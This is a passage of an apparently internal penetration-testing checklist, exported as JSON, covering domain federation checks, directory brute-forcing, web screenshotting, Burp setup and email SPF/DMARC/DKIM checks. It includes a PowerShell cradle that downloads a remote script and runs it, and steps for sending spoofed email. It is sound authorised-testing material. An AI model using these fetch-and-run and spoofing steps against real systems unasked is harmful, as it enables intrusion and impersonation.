						"uid": "537caffc-fc07-46f3-8973-38c681ee2de8",
						"name": "Information Disclosure - ADS Domain - Azure Redirect",
						"instructions": "<h2>Instructions</h2><p>It is possible to determine if a particular domain can be used to authenticate to msonline, azure, and office365 using https://login.microsoftonline.com.</p><h2>Variation: Manual</h2><p>1.  Visit https://login.microsoftonline.com</p><p>2.  Attempt to login with test@clientdomain.com</p><p>3.  Watch for the redirect, if not redirect to valid login page, then it likely not a supported domain</p><h2><strong>Variation: Automated using Get-FederationEndpoint </strong></h2><p>1. Open PowerShell.</p><p>2. Download and import the module.</p><pre><code> iex(new-object net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)</code></pre><p>3. Run against the target domain to determine if it is federated, managed, or neither. Note the the function does support targeting a domain list from a file.</p><pre><code>Get-FederationEndpoint -domain clientdomain.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "30d4dab5-1fb2-4559-abd3-fa2d48fca1b0",
						"name": "Upload Active Directory Domain List",
						"instructions": "<h2>Instructions</h2><p>1. Upload a list of the enumerated Active Directory Domains to the Documents section of the Resolve Platform.</p><p>2. Please place contents in a well labeled .csv or .xls document.</p><p>3. When possible include discovery source and full domain name.</p><p>4. Make sure to publish it so it is visible to the client in Track. </p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "384e41cd-0e43-4487-9e37-7f3af1e54e44",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 10,
				"collapsed": true
			},
			{
				"uid": "5c03b3a0-5543-43ab-8d15-13be95fd100c",
				"name": "Vulnerability Enumeration: Web Applications",
				"description": "This category includes web application attack tasks that apply to the internet network penetration test process.",
				"type": 1,
				"tasks": [
					{
						"uid": "ed2e0b06-d80a-4ccf-b332-5e0dd78e8ee8",
						"name": "Target List",
						"instructions": "<h2>Instructions</h2><p>Build a list of in-scope domains, subdomains, and URLs from enumeration phases to target. These targets should also be used for Burp scanning.</p><h3>Example</h3><p>Build a target list from the following sources:</p><ul><li><p>ASM - Export live domains, DNS Records</p></li><li><p>Subdomain Enumeration - amass, GetAllURLs, Certificate Transparency Logs, Rapid7 OpenData</p></li><li><p>ADS Domain Enumeration</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "37f51e92-91c6-4e15-8a41-1ef7cef365fe",
						"name": "Directory Bruteforce - ffuf [Internal Documents]",
						"instructions": "<h2>Instructions</h2><p>Perform directory bruteforcing to identify administrative portals or sensitive information.</p><h2>Variation: ffuf</h2><pre><code>https://github.com/ffuf/ffuf</code></pre><p>1. Install ffuf via go.</p><pre><code>go install -v github.com/ffuf/ffuf@latest</code></pre><p>2. Run ffuf.</p><pre><code>ffuf -u https://netspi.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt --recursion</code></pre><h2>Variation: gobuster</h2><pre><code>https://github.com/OJ/gobuster</code></pre><p>1. Install gobuster via go.</p><pre><code>go install github.com/OJ/gobuster/v3@latest</code></pre><p>2. Run gobuster.</p><pre><code>gobuster dir -t 50 -u https://nettspi.com/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o dirbrute.txt</code></pre><h2>Variation: auto-gobuster</h2><pre><code>https://github.com/NetSPI/Scripts-Private/tree/master/auto-gobuster</code></pre><p>1. Clone the repository.</p><pre><code>git clone https://github.com/NetSPI/Scripts-Private.git</code></pre><p>2. Download the gobuster binary and place it in the <code>auto-gobuster</code> directory.</p><pre><code>https://github.com/OJ/gobuster</code></pre><p>3. Follow the usage instructions in the README.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a945c002-abd5-449b-970c-731073257b49",
						"name": "Web Scraping - gowitness [Internal Documents]",
						"instructions": "<h2>Instructions</h2><p>Perform screenshot and header capture from all in scope web applications.</p><p>Web scraping should target all web servers (can be found in the \"HTTP - Service Uses Protocol\" finding) by IP and all in scope domain names identified during the reconnaissance phases.</p><p>For the domains, target 80 (HTTP) and 443 (HTTPS). DO NOT target ISP domains. They will not yield additional results. For both IP addresses and domains, target HTTP and HTTPS. </p><h2>Variation: gowitness (Modified)</h2><p>1. Install the internal modified version of gowitness without the easyjson library. Details regarding why a modified version is utilized are explained on the GitHub page.</p><p>URL: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/gowitness-mod\">https://github.com/NetSPI/gowitness-mod</a></p><p>There are two ways to run this version of gowitness:</p><ol><li><p>Download a release from the GitHub repository's <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/gowitness-mod/releases\"><u>release page</u></a>.</p></li><li><p>Clone the repository and build it yourself</p></li></ol><pre><code>git clone https://github.com/NetSPI/gowitness-mod.git\ncd gowitness-mod\ngo build</code></pre><p>2. Run gowitness with a list of URLs or from and nmap scan file.</p><pre><code>gowitness file -f urls.txt -D sqldb_path -P screenshot_path</code></pre><p>OR</p><pre><code>gowitness nmap -f nmap.xml --open --service-contains http -D sqldb_path -P screenshot_path</code></pre><p>3. Generate the report.</p><pre><code>gowitness report export -f webscrape.zip -D sqldb_path -P screenshot_path</code></pre><p>Below are some additional options:</p><ul><li><p>https://github.com/michenriksen/aquatone</p></li><li><p>https://github.com/byt3bl33d3r/WitnessMe</p></li><li><p>https://github.com/Sw4mpf0x/Kraken</p></li><li><p>https://github.com/moloch--/electric-scan</p></li></ul><p>https://blog.cyberadvisors.com/technical-blog/blog/screenshot-tool-part-6-which-tool-is-best</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "988fbcf2-7968-4598-8c91-b5bda7a5cc71",
						"name": "Identify Login Pages",
						"instructions": "<h2>Instructions</h2><p>Review domains and web scraping results for login pages.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "abce63d8-ca5a-4952-816f-2a2a8a3a6681",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "da011dc7-a2b2-4d2e-85cf-3104d3d5fbf3",
						"name": "Web Application Testing Guidance (Dynamic)",
						"instructions": "<p>For additional guidance when testing web applications, please add the \"ExPen - WaPen Checks Add-In\" checklist to the project by marking this task as vulnerable.</p><p>Below is the WaPen BurpSuite setup instructions, minus session handling setup because on ExPen you will primarily perform unauthenticated testing.</p><h3>Burp Suite Setup Instructions:</h3><ol><li><p>Ensure Burp is at the latest version. Click Help -&gt; Check for updates</p></li><li><p>Set up Burp Collaborator, using one of the following options in order of precedence </p><p>   a) Our official Burp Collaborator instance. This is only pollable over NetSPI WARP/VPN. (<a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"http://net-spi.com\">net-spi.com</a>) </p><p>   b) When the above is not available, we have added authentication to our official Collaborator instance on a separate port, but requires a Burp extension. Follow this guide: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://outline.netspi.com/doc/collabauthn-QL7L3mXEVs\">https://outline.netspi.com/doc/collabauthn-QL7L3mXEVs</a></p><p>   c) Finally, when both of the above are not available, we are approved to use the default Portswigger Oastify servers (<a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"http://burpcollaborator.net\">burpcollaborator.net</a>)</p></li><li><p>Confirm Burp Collaborator is reachable by running a health check. <strong>Note:</strong> this will only be successful on the VPN or within the office.</p></li></ol><h3>Burp Suite Active Scanning Setup:</h3><ol><li><p>Set the Scope:</p><ol><li><p>Target &gt; Site Map &gt; Right-click the item and select \"Add to Scope\" for each location that is considered in scope.</p></li><li><p>Target &gt; Scope settings &gt; Check Advanced Scope Control &gt; Click Add and manually enter all the details that matches the scope of the project.</p></li></ol></li><li><p>Create new Audit Configurations:</p><ol><li><p>Dashboard &gt; Click the \"Gear\" under Live audit from Proxy &gt; Scan configuration &gt; New &gt; <span style=\"color: rgb(219, 39, 25)\"><strong>Cookies_Headers</strong></span></p><ol><li><p>Under Insertion Point Types &gt; Uncheck everything except <strong>Cookie parameter values</strong> and <strong>HTTP Headers</strong></p></li><li><p>Under Misc Insertion Point Options &gt; Change the maximum to 1000</p></li></ol></li><li><p>Dashboard &gt; Click the \"Gear\" under Live audit from Proxy &gt; Scan configuration &gt; New &gt; <span style=\"color: rgb(219, 39, 25)\"><strong>NO_Cookies_Headers</strong></span></p><ol><li><p>Under Insertion Point Types &gt; Uncheck <strong>Cookie parameter values</strong> and <strong>HTTP Headers</strong></p></li><li><p>Under Misc Insertion Point Options &gt; Change the maximum to 1000</p></li></ol></li></ol></li></ol><h3>Scanning Instructions:</h3><ol><li><p>Scan a request that includes all cookies and headers used by the application using the new Cookies_Headers Audit Configuration.</p></li><li><p>Scan all application pages that accept parameters with the NO_Cookies_Headers Audit Configuration.</p></li><li><p>To scan a single request, right-click on a request in the Proxy tab/Repeater tab &gt; Do active scan.</p></li><li><p>You can scan multiple requests at the same time by holding Control while selecting the requests, then right-clicking, and selecting Do an active scan.</p></li><li><p>Monitor automated scans in Logger to ensure that the session stays active. Especially when many scans are queued or they just go slowly.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 11,
				"collapsed": true
			},
			{
				"uid": "f0cd6f2b-a0b1-451c-a220-dba7153de1c8",
				"name": "Vulnerability Enumeration: Manual Checks",
				"description": "Vulnerability Enumeration: Manual Checks",
				"type": 1,
				"tasks": [
					{
						"uid": "9be7fce5-97fc-4595-b03a-c4d9f2ceb9d2",
						"name": "SMTP Domains - Identify Lack of SPF [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Verify SPF records exist for email domains, white listed IP ranges and domains cannot be hijacked.</p><p>Check for SPF records on domains being used for email to identify missed SPF records and interesting TXT records that could indicate the use of technologies that could be targeted in future attacks.</p><p><strong>Important Notes</strong></p><ul><li><p>SPF records are a type of DNS TXT record.</p></li><li><p>SPF records contains a list of internet servers allowed to send email for the domain.</p></li><li><p>SPF records can include a &quot;soft fail&quot; (~all) to indicate that IPs sending email for the domain that are not on the list should be marked as SPAM.</p></li><li><p>SPF records can include a hard fail (-all) to indicate that IPs sending email for the domain that are not on the list should be blocked.</p></li><li><p>SPF records may point to another TXT record using the &quot;include:&quot; setting.</p></li></ul><p>Clients getting mail from your domain validate the servers using your SPF records. However, they don't have to honor it.</p><p><strong>Note:</strong> As an attacker if you can obtain access to SPF IPs or relay through them you can spoof email from the domain.</p><h2>Variation: dig</h2><p>1. Use dig to identify SPF records.</p><pre><code><strong>dig txt google.com +short\n\n</strong><strong><span style=\"color: #DB2719\">&quot;v=spf1 include:_spf.google.com ~all&quot;</span></strong><strong>\n</strong>&quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\n&quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\n&quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\n&quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\n&quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\n&quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\n&quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\n&quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;</code></pre><h2>Variation: checkdmarc</h2><p>1. Install checkdmarc.</p><pre><code>pip install checkdmarc</code></pre><p>2. Run checkdmarc against the target domain and use jq to filter for the SPF record.</p><pre><code><strong>checkdmarc google.com | jq '.spf.record'\n\n</strong>&quot;v=spf1 include:_spf.google.com ~all&quot;</code></pre><h2>Variation: dnsrecon</h2><p>1. Run dnsrecon and review the returned records.</p><pre><code><strong>dnsrecon -d google.com\n\n</strong>[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      <strong>TXT google.com v=spf1 include:_spf.google.com ~all\n</strong>[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\n<strong>[TRUNCATED]</strong></code></pre><h2><strong>Variation: nslookup</strong></h2><p>1. Use nslookup and review the returned records.</p><pre><code><strong>nslookup -type=txt google.com\n\n</strong>Server:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\ngoogle.com      text = <strong>&quot;v=spf1 include:_spf.google.com ~all&quot;\n</strong>google.com      text = &quot;facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95&quot;\ngoogle.com      text = &quot;apple-domain-verification=30afIBcvSuDV2PLX&quot;\ngoogle.com      text = &quot;globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=&quot;\ngoogle.com      text = &quot;docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e&quot;\ngoogle.com      text = &quot;google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ&quot;\ngoogle.com      text = &quot;MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB&quot;\ngoogle.com      text = &quot;docusign=1b0a6754-49b1-4db5-8540-d2c12664b289&quot;\ngoogle.com      text = &quot;google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o&quot;\n\nAuthoritative answers can be found from:</code></pre><h3>More Options:</h3><p>https://github.com/BishopFox/spoofcheck.git</p><h2>Reporting Requirements</h2><ul><li><p>Follow up on any odd TXT records to determine if related service have vulnerabilities.</p></li><li><p>Take a screen shot of the command and command output for the email domain that does not have an SPF record.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058974,
							"uid": "36267774-ce5f-e611-80e3-ecf4bbd04083",
							"name": "Weak Configuration - SMTP - SPF Record Not Verified",
							"description": "<p>The Sender Policy Framework (SPF) is an open standard specifying a technical method to prevent sender address forgery. An SPF record is a TXT record in DNS that begins with v=spf1. It includes a list of IPs that sending domain owner has specified as permitted to send email for that domain and it also informs the recipient mail server what to do if an email is received from an IP that is not on the permitted senders list.</p><p>The primary mail servers are not configured to validate or enforce SPF records. Validating SPF records can help prevent attackers from sending forged emails from external domains.</p><p>Example validation command:</p><p>dig domain.com txt host ns1.nameserver1.com</p><p>v=spf1 ip4:95.59.2.21 ip4:95.59.2.22 ip4:195.168.1.0/28 mx -all</p>",
							"severityId": 2,
							"businessImpact": "<p>Attackers may be able to send forged email to impersonate sources of trusts.  As a result, users may click on links or open attachments of a malicious nature that could lead to a compromise of their systems.</p>",
							"sourceIdentifier": "M:36267774-ce5f-e611-80e3-ecf4bbd04083",
							"verificationInstructions": "<p><strong>Running on multiple domains</strong></p><pre><code>cat main_domains.txt | xargs -I % sh -c &quot;echo %;dig txt % +short;echo&quot;</code></pre><p>Send a spoofed email from the internet.</p><p>- as microsoft.com</p><p>- as an internal domain</p><p>Example validation command:</p><p>dig domain.com txt host ns1.nameserver1.com</p><p>v=spf1 ip4:95.59.2.21 ip4:95.59.2.22 ip4:195.168.1.0/28 mx -all</p><p>or for JSON output of SPF records:</p><p>checkdmarc domain.com</p><p>Before executing the steps below create a test email server to conduct attacks from. The mail server does not have to be an Exchange server.</p><p>Use telnet to test SMTP communication</p><p>1. Open a telnet session: From a command prompt, type telnet, and then press ENTER.</p><p>2. Type set local_echo on a computer running Microsoft Windows 2000 Server or SET LOCALECHO on a computer running Windows Server 2003 or Windows XP, and then press ENTER. This command allows you to view the responses to the commands.</p><p>3. Type &lt;your mail server domain&gt; 25,and then press ENTER.</p><p>4. Type EHLO &lt;your mail server domain&gt;, and then press ENTER.</p><p>5. Type AUTH LOGIN. The server responds with an encrypted prompt for your user name.</p><p>6. Enter your user name encrypted in base 64. You can use one of several tools that are available to encode your user name.</p><p>7. The server responds with an encrypted base 64 prompt for your password. Enter your password encrypted in base 64.</p><p>8. Type MAIL FROM:&lt;sender@domain.com&gt;, and then press ENTER. If the sender is not permitted to send mail, the SMTP server returns an error.</p><p>9. Type RCPT TO:&lt;recipient@remotedomain.com&gt;,and then press ENTER.If the recipient is not a valid recipient or the server does not accept mail for this domain, the SMTP server returns an error.</p><p>10. Type DATA.</p><p>11. If desired, type message text, press ENTER, type a period (.), and then press ENTER again.</p><p>12. If mail is working properly, you should see a response similar to the following indicating that mail is queued for delivery.</p><p>target the procedures for the data exfil mail server for easy use just use the squirel webmail interface.</p>",
							"references": "<ul><li>http://markgossa.blogspot.com/2016/01/block-spoofed-email-exchange-2010-2013-2016-part1.html</li><li>http://markgossa.blogspot.com/2016/01/block-spoofed-email-exchange-2010-2013-2016-part2.html</li><li>https://www.socketlabs.com/blog/best-practices-sender-policy-framework-spf/</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Consider configuring the mail server to reject emails that fail SPF validation checks.  Make sure set your SPF record to prohibit all sending IPs that are not specified by using the -all mechanism at the end of the SPF record.</p><p>Your SPF record should look something like this:  v=spf1 ip4:95.59.2.21 ip4:95.59.2.22 ip4:195.168.1.0/28 mx -all </p><p>If split DNS is being used, ensure that SPF is configured on both the external DNS forward lookup zone and the internal DNS forward lookup zone. Also, consider installing an anti-spam agent on the mail server.</p><p>To construct test emails follow the guidance from this article https://technet.microsoft.com/en-us/library/aa995718(v=exchg.65).aspx</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e10ecdb5-0d39-4bcb-b865-b956270103e6",
						"name": "SMTP Domains - Identify Lack of DMARC [ExPowerPen]",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": false,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17065129,
							"uid": "1e5d0d6c-6b8d-e911-8109-ecf4bbd04073",
							"name": "Weak Configuration - DNS - DMARC Record Not Set",
							"description": "<p>Domain-based Message Authentication, Reporting &amp; Conformance (DMARC) is a policy that allows participating domains to signal the use of email identity authentication, and provide automated feedback between participating organizations. Should a malicious actor attempt to spoof emails from the domain, the spoofed emails will fail authentication, and it is possible for the recipient to alert the true owner of the domain to the spoof attempt. Although the lack of a DMARC policy is not a vulnerability in itself, it can make verifying the authenticity of emails from the domain more difficult.</p>",
							"severityId": 1,
							"businessImpact": "<p>Domains which do not supply DMARC information may be more prone to email spoofing attacks, or not receive information that such an attack has occurred.</p>",
							"sourceIdentifier": "M:3eb54af0-0472-4bf6-a9b9-3271865be9b6",
							"verificationInstructions": "<h2>Instructions</h2><p>Determine if the SMTP domains lack DMARC records and add the results to the verification if vulnerable.</p><h3><strong>Guidelines</strong></h3><ul><li><p>Managed and Federated domains that appear to be email domains, have SPF and MX records.</p></li><li><p>Generally don't report on domains that don't have SPF and MX records unless you can verify its used for email.</p></li><li><p>If it has default MX records like &quot;mail.domain.com&quot;, do some additional verification.</p></li><li><p>If you find a DMARC record that contains <code>p=none</code>, and/or the <code>rua</code> tag is missing, blank, or doesn't contain a valid email address, report it as <strong>Weak Configuration - DNS - Misconfigured DMARC Record</strong>, not this finding.</p></li></ul><h2>Variation: dig</h2><p>1. Use dig to identify DMARC records.</p><pre><code><strong>dig txt _dmarc.google.com +short</strong>\n\n&quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;</code></pre><h2>Variation: checkdmarc</h2><p>1. Install checkdmarc.</p><pre><code>pip install checkdmarc</code></pre><p>2. Run checkdmarc against the target domain and use jq to filter for the DMARC record.</p><pre><code><strong>checkdmarc google.com | jq '.dmarc.record'</strong>\n\n&quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;</code></pre><h2>Variation: dnsrecon</h2><p>1. Run dnsrecon and review the returned records.</p><pre><code><strong>dnsrecon -d google.com</strong>\n\n[&#42;] std: Performing General Enumeration against: google.com...\n[-] DNSSEC is not configured for google.com\n[&#42;]      SOA ns1.google.com 216.239.32.10\n[&#42;]      SOA ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns4.google.com 216.239.38.10\n[&#42;]      NS ns4.google.com 2001:4860:4802:38::a\n[&#42;]      NS ns3.google.com 216.239.36.10\n[&#42;]      NS ns3.google.com 2001:4860:4802:36::a\n[&#42;]      NS ns1.google.com 216.239.32.10\n[&#42;]      NS ns1.google.com 2001:4860:4802:32::a\n[&#42;]      NS ns2.google.com 216.239.34.10\n[&#42;]      NS ns2.google.com 2001:4860:4802:34::a\n[&#42;]      MX smtp.google.com 172.217.212.27\n[&#42;]      MX smtp.google.com 172.253.114.27\n[&#42;]      MX smtp.google.com 172.253.119.27\n[&#42;]      MX smtp.google.com 108.177.111.27\n[&#42;]      MX smtp.google.com 74.125.124.27\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c03::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c22::1b\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c23::1a\n[&#42;]      MX smtp.google.com 2607:f8b0:4001:c14::1b\n[&#42;]      A google.com 142.250.191.174\n[&#42;]      AAAA google.com 2607:f8b0:4009:819::200e\n[&#42;]      TXT google.com v=spf1 include:_spf.google.com ~all\n[&#42;]      TXT google.com facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\n[&#42;]      TXT google.com apple-domain-verification=30afIBcvSuDV2PLX\n[&#42;]      TXT google.com globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\n[&#42;]      TXT google.com docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\n[&#42;]      TXT google.com google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\n[&#42;]      TXT google.com MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\n[&#42;]      TXT google.com docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\n[&#42;]      TXT google.com google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\n[&#42;]      <strong><span style=\"color: #DB2719\">TXT _dmarc.google.com v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\n</span></strong><strong>[TRUNCATED]</strong></code></pre><h2><strong>Variation: nslookup</strong></h2><p>1. Use nslookup and review the returned records.</p><pre><code><strong>nslookup -type=txt _dmarc.google.com</strong>\n\nServer:         172.24.0.1\nAddress:        172.24.0.1&#35;53\n\nNon-authoritative answer:\n_dmarc.google.com       text = &quot;v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com&quot;\n\nAuthoritative answers can be found from:</code></pre><p><strong>Running on multiple domains</strong></p><pre><code>cat main_domains.txt | xargs -I % sh -c &quot;echo %;dig txt _dmarc.% +short;echo&quot;</code></pre>",
							"references": "<ul><li>https://dmarc.org/resources/</li><li>https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dmarc-to-validate-email?view=o365-worldwide</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Publish a DMARC TXT DNS record for the affected domain with either the <code>p=reject</code> or <code>p=quarantine</code> policy value specified. Publishing a DMARC TXT DNS record for a domain using the <code>p=none</code> policy value, while potentially useful for initial deployment planning, does not protect the organization and should only be used as a temporary step towards implementation of one of the other policy values.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "066d7e83-ce11-43b9-a7cf-f829ae6c4a9f",
						"name": "SMTP Domains - Identify Lack of DKIM [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Determine if the SMTP domains lack DKIM records. </p><h3><strong>Guidelines</strong></h3><ul><li><p>Managed and Federated domains that appear to be email domains, have SPF and MX records.</p></li><li><p>Generally don't report on domains that don't have SPF and MX records unless you can verify its used for email.</p></li><li><p>If its a default mx records like &quot;mail.domain.com&quot;, do some additional verification.</p></li></ul><p>Typically a DKIM signature will need to be retrieved from the email headers from an email obtained during communication with the client. Check the email properties in Outlook for the email header info and look for a DKIM signature such as the one below:</p><pre><code>DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;\n  <strong><span style=\"color: #DB2719\">d=verisign.com</span></strong>; l=32873; q=dns/txt; <strong><span style=\"color: #DB2719\">s=VRSN</span></strong>;\n  t=1601401722;\n  h=from:to:cc:date:message-id:mime-version:subject;\n  bh=DTKO5HVYiY/N1KPkn9sUNYVyX+W6YZtDm7HgsUwH0sQ=;\n  b=e62LEvcMxOzHAcOd7fMJ0MjZqxFLbtQIpmQV/NL4jIjTbkiXMZpPzkOL\n   gblFKfxLqsu3jRe7VrNWbFYwAA2GjGE9tdIiLfmkgXcgoeJpXHdBoQxbs\n   yphas/FcSCJksz7elGhJ1TMK9CBz+xYdmErC47g+t7X+SU1qtH1p+dxzx\n   O7kfrJmn3JHp+TWDxNln7zZ8ZXz91HcT90gj44TQOaw3govRV3kCCg33A\n   HevXc3gcycWRpsW2bjrTxeiTKSGaYcJmTivWXDdv1qETYrn/cTiLzwxpF\n   bWiURKYaXz7wLE1ZdQig63yurg8ZLU+4O6Sk9nZhv1qt44h03TYrdSuIi\n   g==;</code></pre><p>The values in the &quot;d&quot; (domain) and &quot;s&quot; (selector) fields of the signature can be used to perform a DNS lookup as shown below. The format for the DKIM record query is <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code>:</p><pre><code><strong>&#35; dig @1.1.1.1 txt </strong><strong><span style=\"color: #DB2719\">VRSN</span></strong><strong>._domainkey.</strong><strong><span style=\"color: #DB2719\">verisign.com</span></strong>\n\n; &lt;&lt;&gt;&gt; DiG 9.16.6-Debian &lt;&lt;&gt;&gt; @1.1.1.1 txt VRSN._domainkey.verisign.com\n; (1 server 